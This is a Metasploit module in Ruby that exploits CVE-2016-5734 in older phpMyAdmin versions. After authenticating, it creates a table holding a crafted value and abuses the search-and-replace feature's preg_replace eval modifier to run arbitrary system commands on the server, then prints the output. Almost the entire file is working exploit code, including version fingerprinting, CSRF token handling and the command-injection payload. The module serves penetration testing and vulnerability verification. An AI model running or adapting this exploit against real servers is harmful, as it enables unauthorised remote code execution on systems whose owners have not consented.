##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'            => 'phpMyAdmin Authenticated Remote Code Execution',
      'Description'     => %q{
        phpMyAdmin 4.0.x before 4.0.10.16, 4.4.x before 4.4.15.7, and 4.6.x before
        4.6.3 does not properly choose delimiters to prevent use of the preg_replace e
        (aka eval) modifier, which might allow remote attackers to execute arbitrary
        PHP code via a crafted string, as demonstrated by the table search-and-replace
        implementation.
      },
      'Author' =>
        [
          'Michal Čihař and Cure53', # Discovery
          'Matteo Cantoni <goony[at]nothink.org>' # Metasploit Module
        ],
      'License'         => MSF_LICENSE,
      'References'      =>
        [
          [ 'BID', '91387' ],
          [ 'CVE', '2016-5734' ],
          [ 'CWE', '661' ],
          [ 'URL', 'https://www.phpmyadmin.net/security/PMASA-2016-27/' ],
          [ 'URL', 'https://security.gentoo.org/glsa/201701-32' ],
          [ 'URL', 'https://www.exploit-db.com/exploits/40185/' ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jun 23 2016'))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "Base phpMyAdmin directory path", '/phpmyadmin/']),
        OptString.new('USERNAME', [ true, "Username to authenticate with", 'root']),
        OptString.new('PASSWORD', [ true, "Password to authenticate with", '']),
        OptString.new('DATABASE', [ true, "Existing database at a server", 'phpmyadmin']),
        OptString.new('CMD', [ false, "The command to execute", 'uname -a'])
      ])
  end

  def check
    begin
      res = send_request_cgi({ 'uri' => normalize_uri(target_uri.path, '/js/messages.php') })
    rescue
      print_error("#{peer} - Unable to connect to server")
      return
    end

    if res.code != 200
      print_error("#{peer} - Unable to query /js/messages.php")
      return
    end

    # PHP 4.3.0-5.4.6
    # Remember that servers with PHP version greater than 5.4.6
    # is not exploitable, because of warning about null byte in regexp
    php_version = res['X-Powered-By']
    if php_version
      vprint_status("#{peer} - PHP version: #{php_version}")
      if php_version =~ /PHP\/(\d)\.(\d)\.(\d)/
        if $1.to_i > 5
          return Exploit::CheckCode::Safe
        else
          if $1.to_i == 5 and $2.to_i > 4
            return Exploit::CheckCode::Safe
          else
            if $1.to_i == 5 and $2.to_i == 4 and $3.to_i > 6
              return Exploit::CheckCode::Safe
            end
          end
        end
      end
    else
      vprint_status("#{peer} - Unknown PHP version")
    end

    # 4.3.0 - 4.6.2 authorized user RCE exploit
    if res.body =~ /pmaversion = '(\d)\.(\d)\.(.*)';/
      vprint_status("#{peer} - phpMyAdmin version: #{$1}.#{$2}.#{$3}")
      if $1.to_i > 4
        return Exploit::CheckCode::Safe
      end
      if $1.to_i == 4 and ($2.to_i < 3 or $2.to_i > 6)
        return Exploit::CheckCode::Safe
      else
        if $1.to_i == 4 and $2.to_i >= 6 and $3.to_i > 2
          return Exploit::CheckCode::Safe
        end
      end
      if $1.starts_with? '4'
        return Exploit::CheckCode::Vulnerable
      end
      return Exploit::CheckCode::Detected
    end

    return Exploit::CheckCode::Safe
  end

  def run
    return if check != Exploit::CheckCode::Vulnerable

    uri = target_uri.path
    vprint_status("#{peer} - Grabbing CSRF token...")
    response = send_request_cgi({ 'uri' => uri})
    if response.nil?
      fail_with(Failure::NotFound, "#{peer} - Failed to retrieve webpage grabbing CSRF token")
    end

    if (response.body !~ /"token"\s*value="([^"]*)"/)
      fail_with(Failure::NotFound, "#{peer} - Couldn't find token. Is URI set correctly?")
    else
      vprint_status("#{peer} - Retrieved token")
    end

    token = $1
    post = {
      'token' => token,
      'pma_username' => datastore['USERNAME'],
      'pma_password' => datastore['PASSWORD']
    }

    vprint_status("#{peer} - Authenticating...")

    login = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(uri, 'index.php'),
      'vars_post' => post
    })

    if login.nil?
      fail_with(Failure::NotFound, "#{peer} - Failed to retrieve webpage")
    end

    if login.redirect?
      token = login.redirection.to_s.scan(/token=(.*)[&|$]/).flatten.first
    else
      fail_with(Failure::NotFound, "#{peer} - Couldn't find token. Wrong phpMyAdmin version?")
    end

    cookies = login.get_cookies

    login_check = send_request_cgi({
      'uri' => normalize_uri(uri, 'index.php'),
      'vars_get' => { 'token' => token },
      'cookie' => cookies
    })

    if login_check.body =~ /Welcome to/
      fail_with(Failure::NoAccess, "#{peer} - Authentication failed")
    else
      vprint_status("#{peer} - Authentication successful")
    end

    #
    # Create random table and column
    #

    rand_table = Rex::Text.rand_text_alpha(3+rand(3))
    rand_column = Rex::Text.rand_text_alpha(3+rand(3))
    sql_value = '0%2Fe%00'

    vprint_status("#{peer} - Create random table '#{rand_table}' into '#{datastore['DATABASE']}' database...");

    create_table_post = {
      'show_query' => '0',
      'ajax_request' => 'true',
      'db' => datastore['DATABASE'],
      'pos' => '0',
      'is_js_confirmed' => '0',
      'fk_checks' => '0',
      'sql_delimiter' => ';',
      'token' => token,
      'SQL' => 'Go',
      'ajax_page_request' => 'true',
      'sql_query' => "CREATE+TABLE+`#{rand_table}`+( ++++++`#{rand_column}`+varchar(10)+CHARACTER+SET"\
        "+utf8+NOT+NULL ++++)+ENGINE=InnoDB+DEFAULT+CHARSET=latin1; ++++INSERT+INTO+`#{rand_table}`+"\
        "(`#{rand_column}`)+VALUES+('#{sql_value}'); ++++",
    }

    create_rand_table = send_request_cgi({
      'uri' => normalize_uri(uri, 'import.php'),
      'method' => 'POST',
      'cookie' => cookies,
      'encode_params' => false,
      'vars_post' => create_table_post
    })

    if create_rand_table.body =~ /(.*)<code>\\n(.*)\\n<\\\/code>(.*)/i
      fail_with(Failure::Unknown, "#{peer} - Failed to create a random table")
    else
      vprint_status("#{peer} - Random table created")
    end

    #
    # Execute command
    #

    command = Rex::Text.uri_encode(datastore['CMD'])

    command_payload_data = {
      'columnIndex' => '0',
      'token' => token,
      'submit' => 'Go',
      'ajax_request' => 'true',
      'goto' => 'sql.php',
      'table' => rand_table,
      'replaceWith' => "system%28%27#{command}%27%29%3B",
      'db' => datastore['DATABASE'],
      'find' => sql_value,
      'useRegex' => 'on'
    }

    execute_command = send_request_cgi({
      'uri' => normalize_uri(uri, 'tbl_find_replace.php'),
      'method' => 'POST',
      'cookie' => cookies,
      'encode_params' => false,
      'vars_post' => command_payload_data
    })

    if execute_command.body =~ /(.*);token=(.*)\\"><\\\/a>(.*)\\n","success":true,(.*)/i

      print_good("#{peer} - Output for \"#{datastore['CMD']}\"")
      cmd_output = $3.to_s
      cmd_output.split('\n').each do |line|
        print_good("#{peer} #{line}")
      end

      # Report output
      report_note(
        :rhost => datastore['RHOST'],
        :rport => datastore['RPORT'],
        :type => "os_command",
        :name => datastore['CMD'],
        :data => cmd_output
      )

    else
      fail_with(Failure::Unknown, "#{peer} - Failed to execute the command")
    end

    #
    # Remove random table
    #

    vprint_status("#{peer} - Remove the random table '#{rand_table}' from '#{datastore['DATABASE']}' database")

    remove_table_data = {
      'show_query' => '0',
      'ajax_request' => 'true',
      'db' => datastore['DATABASE'],
      'pos' => '0',
      'is_js_confirmed' => '0',
      'fk_checks' => '0',
      'sql_delimiter' => ';',
      'token' => token,
      'SQL' => 'Go',
      'ajax_page_request' => 'true',
      'sql_query' => "DROP+TABLE+`#{rand_table}`"
    }

    remove_table = send_request_cgi({
      'uri' => normalize_uri(uri, 'import.php'),
      'method' => 'POST',
      'cookie' => cookies,
      'encode_params' => false,
      'vars_post' => remove_table_data
    })

    if remove_table.body !~ /(.*)MySQL returned an empty result set \(i.e. zero rows\).(.*)/i
      fail_with(Failure::Unknown, "#{peer} - Failed to remove the random table")
    end
  end
end
